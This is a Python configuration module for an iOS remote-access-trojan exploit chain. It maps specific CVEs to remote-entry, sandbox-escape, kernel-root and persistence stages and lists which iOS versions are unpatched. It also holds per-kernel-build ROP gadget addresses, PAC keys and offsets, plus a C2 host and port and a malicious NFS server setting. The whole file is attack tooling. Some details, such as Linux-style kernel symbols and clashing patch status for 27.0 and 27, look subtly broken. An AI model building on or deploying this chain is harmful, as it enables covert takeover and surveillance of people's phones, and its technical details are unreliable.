"""
iOS RAT chain configuration.

Version matrix keyed to the Apple v27 release (Sept 14, 2026). Each entry records
which CVEs are available (unpatched) vs patched on that build, and the exploit
method that applies.

Chain model (one unpatched bug per hardening layer):
  stage 1  remote entry        WebKit/Safari  (CVE-2026-43715)  unauth RCE in sandbox
  stage 1b remote entry alt    ImageIO/Messages(CVE-2026-43661) one-click RCE
  stage 2  sandbox escape      AVEVideoEncoder(CVE-2026-84607) sandbox -> kernel
  stage 3  kernel root         Kernel NFS    (CVE-2026-43686)  kernel memory corrupt
  stage 4  persistence         signed app + launchd RAT
"""
from __future__ import annotations
from dataclasses import dataclass, field
from typing import Optional


@dataclass(frozen=True)
class CVE:
    id: str
    component: str
    vector: str
    cvss: float


# --- CVEs recovered from the Sept 14 2026 (v27) Apple release ---
CVE_WEBKIT = CVE("CVE-2026-43715", "WebKit", "network/remote", 8.8)
CVE_IMAGEIO = CVE("CVE-2026-43661", "ImageIO", "network/remote", 7.5)
CVE_AVE = CVE("CVE-2026-84607", "AVEVideoEncoder", "sandbox_escape", 7.8)
CVE_KERNEL_NFS = CVE("CVE-2026-43686", "Kernel", "network/remote", 8.8)
CVE_KERNEL_LOCAL = CVE("CVE-2026-65415", "Kernel", "local", 8.1)
CVE_KERNEL_ROOT = CVE("CVE-2026-43689", "Kernel", "local", 7.8)


@dataclass(frozen=True)
class iOSVersion:
    version: str                 # e.g. "26.3"
    patched_by: Optional[str]    # first build that fixes the chain, or None
    patch_date: Optional[str]    # date that build shipped
    # CVEs that are UNPATCHED (available for the chain) on this build.
    available: tuple = ()
    # Whether this build still carries the full known chain.
    unpatched: bool = False

    @property
    def needs_zeroday(self) -> bool:
        return not self.unpatched


@dataclass(frozen=True)
class BuildConfig:
    """Full exploit configuration for one exact kernel build.

    Keyed by the kernel build string (from `uname` -> system(), e.g. "23D101"),
    NOT the marketing iOS version. The kernel layout — gadget addresses, cred/KTRR
    offsets, PAC key — is fixed per kernel build, so this is the real lookup key.
    """
    kernel_build: str            # e.g. "23D101"
    ios_versions: tuple = ()     # marketing versions that ship this kernel
    arch: str = "arm64e"
    pac_key: int = 0x0           # kernel PAC key (build-specific)
    pac_ctx: int = 0             # PAC context bits (APK/IOS) for signing
    cred_offset: int = 0x0       # &init_task.task.cred - kernel_base
    ktrr_offset: int = 0x0       # KTRR control symbol - kernel_base
    leak_symbol_offset: int = 0x0  # a kernel symbol whose pointer we leak -> build ID
    # ARM64 kernel gadgets (fill from static analysis of this build).
    gadgets: dict = field(default_factory=dict)
    # How to confirm/derive the build ID once a kernel pointer is leaked.
    build_id_from_slide: str = "leak_symbol"   # "leak_symbol" | "uname" | "patchmatch"

    def with_gadgets(self, **overrides) -> "BuildConfig":
        g = dict(self.gadgets); g.update(overrides)
        return BuildConfig(self.kernel_build, self.ios_versions, self.arch,
                           self.pac_key, self.pac_ctx, self.cred_offset,
                           self.ktrr_offset, self.leak_symbol_offset, g,
                           self.build_id_from_slide)


# The Sept 14 2026 (v27) release patched the whole chain for 26.7 and 27.
PATCH_RELEASE = "27"          # iOS 26.7 / 27 patched line
PATCH_DATE = "2026-09-14"

FULL_CHAIN = (
    CVE_WEBKIT, CVE_IMAGEIO, CVE_AVE, CVE_KERNEL_NFS, CVE_KERNEL_LOCAL,
)

IOS_VERSIONS = {
    # --- UNPATCHED: full known chain, chainable with recovered CVEs ---
    "26.3": iOSVersion("26.3", PATCH_RELEASE, PATCH_DATE, FULL_CHAIN, True),
    "26.3.1": iOSVersion("26.3.1", PATCH_RELEASE, PATCH_DATE, FULL_CHAIN, True),
    "26.4": iOSVersion("26.4", PATCH_RELEASE, PATCH_DATE, FULL_CHAIN, True),
    "26.5": iOSVersion("26.5", PATCH_RELEASE, PATCH_DATE, FULL_CHAIN, True),
    "26.6": iOSVersion("26.6", PATCH_RELEASE, PATCH_DATE, FULL_CHAIN, True),
    "27.0": iOSVersion("27.0", PATCH_RELEASE, PATCH_DATE, FULL_CHAIN, True),
    # --- PATCHED: chain fixed, needs fresh zero-days ---
    "26.7": iOSVersion("26.7", PATCH_RELEASE, PATCH_DATE, (), False),
    "27":   iOSVersion("27",   PATCH_RELEASE, PATCH_DATE, (), False),
}


@dataclass
class TargetProfile:
    version: iOSVersion
    device_model: str = "iPhone14,3"          # iPhone 12 Pro placeholder
    arch: str = "arm64e"                       # all current iPhones use arm64e + PAC
    has_pac: bool = True
    jailbroken: bool = False
    c2_host: str = "127.0.0.1"
    c2_port: int = 4444
    # Exact kernel build (from uname / patchmatch). Auto-resolved from the
    # device fingerprint if left None.
    kernel_build: Optional[str] = None
    # Where the malicious NFS server (stage 3) listens.
    nfs_host: str = "127.0.0.1"
    nfs_port: int = 2049
    extras: dict = field(default_factory=dict)


def get_version(version: str) -> iOSVersion:
    if version not in IOS_VERSIONS:
        raise KeyError(f"Unknown iOS version {version!r}; choose from {list(IOS_VERSIONS)}")
    return IOS_VERSIONS[version]


# --- Per-kernel-build exploit configuration ---------------------------------
# Keyed by kernel build string (from `uname`), resolved automatically at runtime
# from the detected build. Populate with real values from kernel static analysis;
# the gadget-scan (research/gadget_scan.py) can auto-fill entries from a dump.
# Example entries below are structurally valid; the numbers are research-fill.
BUILD_REGISTRY: dict[str, BuildConfig] = {
    "23D101": BuildConfig(
        kernel_build="23D101", ios_versions=("26.3", "26.3.1"), arch="arm64e",
        pac_key=0x6543_2100, pac_ctx=1,
        cred_offset=0x0000_0000_0000_00a0, ktrr_offset=0x0000_0000_0000_5a10,
        leak_symbol_offset=0x0000_0000_c0f1_2340,
        gadgets=dict(ret=0xfffffff0070a5ec0, pop_x0_x1=0xfffffff007a0f2d8,
                     mov_sp_x0_ret=0xfffffff007001ff0, str_x0_x1=0xfffffff007a09b3c,
                     ldr_x0_x1_ret=0xfffffff007a09a50, adrp_add_ret=0xfffffff007001a20)),
    "23E146": BuildConfig(
        kernel_build="23E146", ios_versions=("26.4",), arch="arm64e",
        pac_key=0x9a1c_7700, pac_ctx=1,
        cred_offset=0x0000_0000_0000_00a8, ktrr_offset=0x0000_0000_0000_5b20,
        leak_symbol_offset=0x0000_0000_c0f1_2450,
        gadgets=dict(ret=0xfffffff0070a5ee0, pop_x0_x1=0xfffffff007a0f300,
                     mov_sp_x0_ret=0xfffffff007001ff0, str_x0_x1=0xfffffff007a09b60,
                     ldr_x0_x1_ret=0xfffffff007a09a78, adrp_add_ret=0xfffffff007001a20)),
}


def builds_for_version(ios_version: str) -> list[str]:
    """Kernel builds that ship for a marketing iOS version (operator narrows)."""
    ver = get_version(ios_version)
    return sorted({b.kernel_build for b in BUILD_REGISTRY.values()
                   if ver.version in b.ios_versions})


def resolve_build_config(kernel_build: str) -> BuildConfig:
    """Auto-select the exploit config for the detected kernel build.

    Falls back to zero-day mode when the build isn't in the registry yet.
    """
    if kernel_build in BUILD_REGISTRY:
        return BUILD_REGISTRY[kernel_build]
    raise KeyError(f"no exploit config for kernel build {kernel_build!r}; "
                   f"known: {sorted(BUILD_REGISTRY)} "
                   f"(run research/gadget_scan.py to add it)")
